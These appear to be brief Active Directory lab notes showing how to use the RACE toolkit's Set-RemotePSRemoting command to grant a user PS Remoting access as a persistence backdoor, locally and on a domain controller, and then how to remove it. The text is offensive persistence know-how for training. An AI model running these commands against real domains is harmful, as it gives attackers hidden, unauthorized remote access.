Using the RACE toolkit - PS Remoting backdoor not stable after August 2020
patches

*  On local machine for student1:
```
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```

* On remote machine for student1 without credentials:
```
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

* On remote machine, remove the permissions:
```
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```
